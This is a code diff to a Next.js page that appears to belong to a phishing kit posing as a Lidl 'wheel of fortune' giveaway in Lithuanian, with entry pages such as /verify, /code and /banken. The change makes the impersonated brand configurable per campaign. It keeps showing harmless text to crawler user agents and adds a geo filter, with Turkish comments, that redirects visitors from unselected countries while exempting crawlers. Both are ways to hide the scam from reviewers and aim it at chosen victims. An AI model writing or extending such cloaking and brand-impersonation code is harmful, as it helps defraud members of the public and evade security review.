@@ -1,9 +1,11 @@
 import { redirect } from "next/navigation";
 import { cookies, headers } from "next/headers";
 import { createSessionAction } from "@/app/actions/create-session";
-import { buildShareMetadata } from "@/lib/share-metadata";
+import { buildShareMetadata, getCampaignNameServer } from "@/lib/share-metadata";
+import { brandify } from "@/lib/brand";
 import { createServerSupabaseClient } from "@/lib/supabase/server";
 import { stepToPath } from "@/lib/session-routes";
+import { getBlockedRedirectUrl } from "@/lib/geo-guard";
 import { ACTIVE_SESSION_COOKIE } from "@/lib/session-constants";
 
 const ALLOWED_ENTRY_PAGES = ["/win", "/verify", "/wheel", "/code", "/banken"];
@@ -102,18 +104,29 @@ export default async function Home({ searchParams }: Props) {
     const h = await headers();
     const ua = h.get("user-agent") || "";
     if (BOT_UA.test(ua)) {
+      const campaign = await getCampaignNameServer();
       return (
         <main>
-          <h1>Lidl — Laimės Ratas</h1>
+          <h1>{brandify("Lidl — Laimės Ratas", campaign)}</h1>
           <p>
-            Lidl specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir
-            laimėkite išskirtinius prizus.
+            {brandify(
+              "Lidl specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
+              campaign,
+            )}
           </p>
         </main>
       );
     }
   } catch {
     // headers() erisilemezse normal akis
+  }
+
+  // Geo filtre: secili olmayan ulkeden gelen ziyaretci yonlendirme URL'sine gider.
+  // Bot/crawler UA'lari getBlockedRedirectUrl icinde muaf tutulur (OG bozulmaz).
+  {
+    const h = await headers();
+    const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
+    if (blockedUrl) redirect(blockedUrl);
   }
 
   let partnerName = "admin";
